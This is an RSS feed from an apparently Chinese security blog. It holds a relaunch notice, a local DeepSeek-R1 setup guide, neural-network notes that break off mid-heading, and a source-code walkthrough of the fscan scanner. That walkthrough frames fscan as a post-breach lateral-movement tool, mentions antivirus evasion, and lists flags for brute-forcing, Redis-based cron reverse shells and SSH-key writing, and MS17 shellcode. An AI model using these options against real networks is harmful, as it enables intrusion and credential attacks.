<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Y4ph3tS blog</title>
    <link>http://localhost:1313/</link>
    <description>Recent content on Y4ph3tS blog</description>
    <generator>Hugo</generator>
    <language>en</language>
    <lastBuildDate>Thu, 27 Mar 2025 23:40:18 +0800</lastBuildDate>
    <atom:link href="http://localhost:1313/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>写在前面——Reborn</title>
      <link>http://localhost:1313/posts/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2reborn/</link>
      <pubDate>Sat, 30 Nov 2024 12:00:00 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E5%86%99%E5%9C%A8%E5%89%8D%E9%9D%A2reborn/</guid>
      <description>&lt;h1 id=&#34;博客重新上线&#34;&gt;博客重新上线&lt;/h1&gt;&#xA;&lt;p&gt;之前写过的博客因为各种各样的原因停更，加上之前笔记崩了，从后来恢复只剩二百多篇了😅😅😅&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../image.png&#34; alt=&#34;Alt text&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;从之前发的文章、议题、笔记里选了几篇重新整个博客，也算是记录一下吧，反正之前也是年更博主（手动狗头）&lt;/p&gt;&#xA;&lt;p&gt;现在文章少，用的第三方框架也没设计啥功能，等文章多了以后考虑对博客框架进行二开&amp;hellip;&lt;/p&gt;</description>
    </item>
    <item>
      <title>红队基础设施建设与改造（五）——Fscan从代码逻辑到二开</title>
      <link>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%94fscan%E4%BB%8E%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%88%B0%E4%BA%8C%E5%BC%80/</link>
      <pubDate>Thu, 27 Mar 2025 23:40:18 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%BA%A2%E9%98%9F%E5%9F%BA%E7%A1%80%E8%AE%BE%E6%96%BD%E5%BB%BA%E8%AE%BE%E4%B8%8E%E6%94%B9%E9%80%A0%E4%BA%94fscan%E4%BB%8E%E4%BB%A3%E7%A0%81%E9%80%BB%E8%BE%91%E5%88%B0%E4%BA%8C%E5%BC%80/</guid>
      <description>&lt;h2 id=&#34;fscan简介和基础结构&#34;&gt;Fscan简介和基础结构&lt;/h2&gt;&#xA;&lt;p&gt;fscan是用Go语言编写的端口扫描工具，它具有高效、快速的特点，能够对目标主机的端口进行扫描，并识别开放的服务等信息。在内网探测的时候效果挺好，很多攻击队在打点突破拿到边界机之后都会喜欢上传fscan、frp等工具来进行内网探测，辅助横向移动进行下一步攻击&lt;/p&gt;&#xA;&lt;p&gt;现在fscan已经重构生成了2.0版本，但是因为文章写慢了，刚开始 写的时候用的是1.x的版本，2.0也没细看，所以先分析1.x版本，后面有时间在写2.0（都鸽们，怎么会骗你呢），本文主要从fscan的源码入手，分析fscan的原理，并简单介绍如何进行fscan的免杀和魔改，如果没有go语言基础的同学建议学习一下&lt;/p&gt;&#xA;&lt;p&gt;1代的最新版本是1.8.4，可在以下链接下载&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/shadow1ng/fscan/archive/refs/tags/1.8.4.zip&#34;&gt;https://github.com/shadow1ng/fscan/archive/refs/tags/1.8.4.zip&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;基本目录结构如下&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fscan/image-20250309150606982.png&#34; alt=&#34;image-20250309150606982&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;Fscan&#xA;├─common&#xA;├─image&#xA;├─Plugins&#xA;├─WebScan&#xA;├─go.mod&#xA;├─go.sum&#xA;├─main.go&#xA;├─README.md&#xA;└─LICENSE.txt&lt;/p&gt;&#xA;&lt;p&gt;common是基础模块，包含了如启动参数解析、地址解析、日志记录、代理、基础配置等功能的实现源码&lt;/p&gt;&#xA;&lt;p&gt;image是readme的图片存储目录&lt;/p&gt;&#xA;&lt;p&gt;Plugins是插件目录，主要功能为实现ftp、rdp、mysql等服务的探测以及弱口令的检测&lt;/p&gt;&#xA;&lt;p&gt;webscan是web扫描实现部分，用于使用内置的poc进行漏洞扫描&lt;/p&gt;&#xA;&lt;p&gt;gomd和gosum就不说了&lt;/p&gt;&#xA;&lt;p&gt;main.go是主方法，程序入口点&lt;/p&gt;&#xA;&lt;h2 id=&#34;代码分析&#34;&gt;代码分析&lt;/h2&gt;&#xA;&lt;p&gt;从main.go入手分析&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fscan/image-20250309164635838.png&#34; alt=&#34;image-20250309164635838&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;start := time.Now()记录了程序开始的时间，用于后续计算程序运行的总耗时&lt;/p&gt;&#xA;&lt;p&gt;flag是打印logo和参数的模块，从common中能直接看到相关代码&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../fscan/image-20250309165131907.png&#34; alt=&#34;image-20250309165131907&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;顺便介绍一下参数&lt;/p&gt;&#xA;&lt;table&gt;&#xA;  &lt;thead&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;th&gt;参数名&lt;/th&gt;&#xA;          &lt;th&gt;参数类型&lt;/th&gt;&#xA;          &lt;th&gt;默认值&lt;/th&gt;&#xA;          &lt;th&gt;描述&lt;/th&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/thead&gt;&#xA;  &lt;tbody&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-h&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;要扫描的主机IP地址，例如: 192.168.11.11&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-hn&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;不扫描的主机，例如: -hn 192.168.1.1/24&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-p&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;默认端口&lt;/td&gt;&#xA;          &lt;td&gt;指定端口，例如: 22&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pa&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;基于DefaultPorts添加端口，-pa 3389&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-usera&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;基于DefaultUsers添加用户，-usera user&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pwda&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;基于DefaultPasses添加密码，-pwda password&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pn&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;不扫描的端口，例如: -pn 445&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-c&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;执行命令 (ssh和wmi)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-sshkey&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;ssh密钥文件 (id_rsa)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-domain&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;smb域&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-user&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;用户名&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pwd&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;密码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-time&lt;/td&gt;&#xA;          &lt;td&gt;int64&lt;/td&gt;&#xA;          &lt;td&gt;3&lt;/td&gt;&#xA;          &lt;td&gt;设置超时时间&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-m&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;ldquo;all&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;选择扫描类型，例如: -m ssh&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-path&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;fcgi、smb远程文件路径&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-t&lt;/td&gt;&#xA;          &lt;td&gt;int&lt;/td&gt;&#xA;          &lt;td&gt;600&lt;/td&gt;&#xA;          &lt;td&gt;线程数&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-top&lt;/td&gt;&#xA;          &lt;td&gt;int&lt;/td&gt;&#xA;          &lt;td&gt;10&lt;/td&gt;&#xA;          &lt;td&gt;显示存活数量前几位&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-hf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;主机文件，-hf ip.txt&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-userf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;用户名文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pwdf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;密码文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-portf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;端口文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pocpath&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;poc文件路径&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-rf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;写入sshkey文件的redis文件 (例如: -rf id_rsa.pub)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-rs&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;写入计划任务文件的redis shell (例如: -rs 192.168.1.1:6666)&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-nopoc&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不扫描web漏洞&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-nobr&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不暴力破解密码&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-br&lt;/td&gt;&#xA;          &lt;td&gt;int&lt;/td&gt;&#xA;          &lt;td&gt;1&lt;/td&gt;&#xA;          &lt;td&gt;暴力破解线程数&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-np&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不进行ping扫描&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-ping&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;使用ping替代icmp&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-o&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;ldquo;result.txt&amp;rdquo;&lt;/td&gt;&#xA;          &lt;td&gt;输出文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-no&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不保存输出日志&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-debug&lt;/td&gt;&#xA;          &lt;td&gt;int64&lt;/td&gt;&#xA;          &lt;td&gt;60&lt;/td&gt;&#xA;          &lt;td&gt;每次记录错误日志的时间间隔&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-silent&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;静默扫描&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-nocolor&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不使用颜色输出&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-full&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;poc全面扫描，例如: shiro 100 key&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-u&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;url&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-uf&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;url文件&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-pocname&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;使用包含pocname的poc，-pocname weblogic&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-proxy&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;设置poc代理，-proxy http://127.0.0.1:8080&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-socks5&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;设置socks5代理，将在tcp连接中使用，超时设置将不生效&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-cookie&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;设置poc cookie，-cookie rememberMe=login&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-wt&lt;/td&gt;&#xA;          &lt;td&gt;int64&lt;/td&gt;&#xA;          &lt;td&gt;5&lt;/td&gt;&#xA;          &lt;td&gt;设置web超时时间&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-dns&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;使用dnslog poc&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-num&lt;/td&gt;&#xA;          &lt;td&gt;int&lt;/td&gt;&#xA;          &lt;td&gt;20&lt;/td&gt;&#xA;          &lt;td&gt;poc速率&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-sc&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;ms17 shellcode，例如 -sc add&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-wmi&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;开启wmi&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-hash&lt;/td&gt;&#xA;          &lt;td&gt;string&lt;/td&gt;&#xA;          &lt;td&gt;&amp;quot;&amp;quot;&lt;/td&gt;&#xA;          &lt;td&gt;hash&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-noredis&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;不进行redis安全测试&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;      &lt;tr&gt;&#xA;          &lt;td&gt;-json&lt;/td&gt;&#xA;          &lt;td&gt;bool&lt;/td&gt;&#xA;          &lt;td&gt;false&lt;/td&gt;&#xA;          &lt;td&gt;json格式输出&lt;/td&gt;&#xA;      &lt;/tr&gt;&#xA;  &lt;/tbody&gt;&#xA;&lt;/table&gt;&#xA;&lt;h3 id=&#34;scanner实现&#34;&gt;Scanner实现&lt;/h3&gt;&#xA;&lt;p&gt;Parse.go文件用于解析url、密码字典路径、指定用户名等等参数的相关内容，不展开了，感兴趣的可以自己去看一下&lt;/p&gt;</description>
    </item>
    <item>
      <title>Deepseek-R1本地部署过程</title>
      <link>http://localhost:1313/posts/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2deepseek/</link>
      <pubDate>Tue, 04 Feb 2025 22:30:00 +0000</pubDate>
      <guid>http://localhost:1313/posts/%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2deepseek/</guid>
      <description>&lt;p&gt;最近很多人都在研究本地大模型的部署，我也来踩个坑，其实部署方式很简单，本篇主要记录了本地部署和本地图形化UI工具的部署过程&lt;/p&gt;&#xA;&lt;p&gt;访问https://ollama.com/download下载ollama&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204213106554.png&#34; alt=&#34;image-20250204213106554&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;下载完成后进行默认安装，之后任务栏里会出现托盘图标&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204213654426.png&#34; alt=&#34;image-20250204213654426&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;起一个新的CMD窗口看看是否已经自动配好了环境变量&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204213747881.png&#34; alt=&#34;image-20250204213747881&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来确定一下本地的GPU版本，可以用一些工具如GPU-z等，我用了MATLAB自带的gpuinfo进行查看，我的GPU型号为NVIDIA RTX 3080Ti，有点老了，毕竟电脑用了好多年了已经&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204214042149.png&#34; alt=&#34;image-20250204214042149&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;以下为网上找的一个适配版本的图，可以参考一下自己的GPU能够跑哪些版本的模型&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204214334125.png&#34; alt=&#34;image-20250204214334125&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如果已经可以正常使用，就可以通过以下命令进行安装，稳妥起见用了1.5b，如果用7B其实也问题不大，&lt;del&gt;经测试如果让显卡能烤地瓜的话8B也能跑，别说是我说的&lt;/del&gt;&lt;/p&gt;&#xA;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;ollama run deepseek-r1:1.5b&#xA;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;安装完成后如下图，可以直接提问，且响应速度还挺快的&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204220121827.png&#34; alt=&#34;image-20250204220207394&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;接下来配置一下本地UI，使用chatbox这个工具进行，地址为https://chatboxai.app/zh&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204215303052.png&#34; alt=&#34;image-20250204215303052&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;安装完成后进行配置，首先创建OLLAMA的环境变量，确保能够访问到服务&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204220417911.png&#34; alt=&#34;image-20250204220417911&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;然后再chatbox中进行配置&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204215412626.png&#34; alt=&#34;image-20250204215412626&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;选择ollama的API&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204215453672.png&#34; alt=&#34;image-20250204215453672&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;选择本地模型&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204220505613.png&#34; alt=&#34;image-20250204220505613&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;此时已经成功连接了本地的ollama&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204220548559.png&#34; alt=&#34;image-20250204220548559&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;这时候一些简单的东西在无互联网连接的情况下也能正常回答，非常流畅可以说是&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;../ollma/image-20250204221112791.png&#34; alt=&#34;image-20250204221112791&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>神经网络基础</title>
      <link>http://localhost:1313/posts/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</link>
      <pubDate>Thu, 30 Jan 2025 16:08:36 +0800</pubDate>
      <guid>http://localhost:1313/posts/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80/</guid>
      <description>&lt;p&gt;最近AI挺火的，重新开始学习一下神经网络并且整理一些东西，简单写点笔记记录一下。&lt;/p&gt;&#xA;&lt;p&gt;神经网络是一种模仿生物神经系统结构和功能的计算模型，主要用于机器学习和人工智能领域。它由大量相互连接的节点（称为“神经元”）组成，这些节点通过加权连接传递信息。神经网络的核心思想是通过调整这些连接的权重来学习数据中的模式。&lt;/p&gt;&#xA;&lt;h3 id=&#34;主要组成部分&#34;&gt;主要组成部分&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;输入层&lt;/strong&gt;：接收外部输入数据。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;隐藏层&lt;/strong&gt;：位于输入层和输出层之间，负责处理数据。可以有多个隐藏层。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;输出层&lt;/strong&gt;：生成最终的输出结果。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;h3 id=&#34;工作原理&#34;&gt;工作原理&lt;/h3&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;前向传播&lt;/strong&gt;：输入数据通过各层传递，每层对数据进行加权和激活函数处理，最终生成输出。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;激活函数&lt;/strong&gt;：引入非线性，使网络能够学习复杂模式，常用函数包括ReLU、Sigmoid和Tanh。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;损失函数&lt;/strong&gt;：衡量预测结果与实际结果的差距。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;反向传播&lt;/strong&gt;：通过梯度下降法调整权重，最小化损失函数。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;优化算法&lt;/strong&gt;：如SGD、Adam，用于更新权重。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;主要类型&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;&lt;strong&gt;前馈神经网络（FNN）&lt;/strong&gt;：信息单向传递，无循环。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;卷积神经网络（CNN）&lt;/strong&gt;：适用于图像处理，通过卷积层提取特征。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;循环神经网络（RNN）&lt;/strong&gt;：处理序列数据，具有记忆功能。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;长短期记忆网络（LSTM）&lt;/strong&gt;：RNN的改进，解决长序列依赖问题。&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;生成对抗网络（GAN）&lt;/strong&gt;：由生成器和判别器组成，用于生成数据。&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;p&gt;网上搜了些文章资料，大致总结出的学习内容，数学基础：了解线性代数、微积分和概率论，特别是矩阵运算、导数和梯度等概念。编程基础：熟悉Python，掌握NumPy、Pandas等数据处理库。&lt;/p&gt;&#xA;&lt;h3 id=&#34;神经网络中的数学基础&#34;&gt;神经网络中的数学基础&lt;/h3&gt;&#xA;&lt;h3 id=&#34;1-线性代数&#34;&gt;1. 